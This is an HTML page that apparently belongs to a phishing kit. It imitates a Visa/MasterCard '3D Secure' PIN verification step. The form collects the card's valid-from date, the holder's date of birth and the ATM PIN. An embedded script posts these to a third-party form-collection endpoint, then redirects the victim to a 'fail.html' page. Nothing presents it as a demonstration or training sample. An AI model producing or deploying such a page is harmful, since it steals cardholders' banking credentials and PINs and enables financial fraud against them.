<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Step 2</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="Screenshot 2024-09-13 at 2.00.14 AM.png" alt="Verified by VISA">
            <img src="Screenshot 2024-09-14 at 3.03.42 AM.png" alt="MasterCard">
        </div>

        <h3>Verify 3D Secure PIN Step 1 of 2</h3>
        <p>Please provide the information in the space below, to confirm your identity.</p>

        <form action="https://www.formbackend.com/f/220f1c22d86ad667" method="POST" onsubmit="handleFormSubmit(event)">
            <div class="inputBox">
                <label for="transactionId">Card Number:</label>
                <input type="text" id="transactionId" placeholder="XXXX XXXX XXXX XXXX" style="font-weight:bold;" readonly>
            </div>

            <div class="flex">
                <div class="inputBox">
                    <label for="expMonth">Valid From</label>
                    <div style="display: flex;">
                        <input type="text" name="validFromMonth" placeholder="MM" required>
                        <input type="text" name="validFromYear" placeholder="YY" required>
                    </div>
                </div>
            </div>

            <div class="flex">
                <div class="inputBox">
                    <label for="dob">Date Of Birth:</label>
                    <div style="display: flex;">
                        <input type="text" name="dobDay" placeholder="DD" required>
                        <input type="text" name="dobMonth" placeholder="MM" required>
                        <input type="text" name="dobYear" placeholder="YY" required>
                    </div>
                </div>
            </div>

            <div class="inputBox">
                <label for="cvv">ATM PIN</label>
                <input type="text" name="atmPin" id="cvv" placeholder="Enter PIN" required>
            </div>

            <!-- Submit button -->
            <input type="submit" value="Submit" class="submit-btn">
        </form>

        <p class="timeout">This page will automatically timeout after 180 seconds</p>
    </div>

    <script>
        function handleFormSubmit(event) {
            event.preventDefault();  // Prevent the default form submission

            const form = event.target;

            // Submitting the form data using the fetch API
            fetch(form.action, {
                method: 'POST',
                body: new FormData(form),
                headers: {
                    'Accept': 'application/json'
                }
            }).then(response => {
                if (response.ok) {
                    // Redirect to index.html after successful submission
                    window.location.href = "fail.html";
                } else {
                    alert('Form submission failed.');
                }
            }).catch(error => {
                alert('There was an error submitting the form.');
            });
        }
    </script>

    <script src="index.js"></script>
</body>
</html>
